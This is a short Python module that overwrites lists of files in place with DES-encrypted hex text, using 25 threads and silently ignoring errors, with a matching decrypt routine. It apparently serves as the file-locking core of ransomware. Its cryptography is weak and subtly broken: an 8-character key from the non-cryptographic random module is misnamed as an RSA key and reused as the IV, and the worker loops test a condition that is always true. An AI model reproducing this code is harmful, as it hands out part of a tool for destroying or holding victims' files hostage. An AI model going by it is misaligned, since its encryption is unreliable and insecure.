
import random
from threading import Thread
from queue import Queue

# enc
from pyDes import des, CBC, PAD_PKCS5
import binascii

def generate_rsa_key():
    
    # generate key pool
    key_character_pool = "";
    for i in range(0x21,0x7E):
        key_character_pool += (chr(int(i)))
        
    
    # generate encryption key  
    encryption_level = 8;
    encryption_key = "";
    for i in range(encryption_level):
        encryption_key += random.choice(key_character_pool);
        
    return encryption_key;


def des_encrypt(s,key):
    secret_key = key;
    iv = secret_key
    k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5)
    en = k.encrypt(s, padmode=PAD_PKCS5)
    return binascii.b2a_hex(en).decode()

def des_decrypt(s,key):
    secret_key = key;
    iv = secret_key
    k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5)
    de = k.decrypt(binascii.a2b_hex(s), padmode=PAD_PKCS5)
    return de.decode()

def custom_encrypt_files(encryption_key,q):
  
    while q.not_empty:
        file = q.get();
        try:
            with open(file,'rb') as f:
                data = f.read();
                
            if data:
                with open(file,'w') as f:
                    data = des_encrypt(data,encryption_key)
                    f.write(data)
        except:
            pass;
        
        q.task_done();

def custom_decrypt_files(encryption_key,q):
  
    while q.not_empty:
        file = q.get();
        try:
            with open(file,'rb') as f:
                data = f.read();
                
            if data:
                with open(file,'w') as f:
                    data = des_decrypt(data,encryption_key)
                    f.write(data)
        except:
            pass;
        
        q.task_done();


def prepare_encrypt_file(paths_to_file,encryption_key):
    q = Queue()
    for file in paths_to_file:
        q.put(file);
    
    for i in range(25):
        thread = Thread(target=custom_encrypt_files, daemon= True,args=(encryption_key,q,));
        thread.start();
    
    q.join();
    
    return 1;

def prepare_decrypt_file(paths_to_file,encryption_key):
    q = Queue()
    for file in paths_to_file:
        q.put(file);
    
    for i in range(25):
        thread = Thread(target=custom_decrypt_files, daemon= True,args=(encryption_key,q,));
        thread.start();
    
    q.join();
    
    return 1;



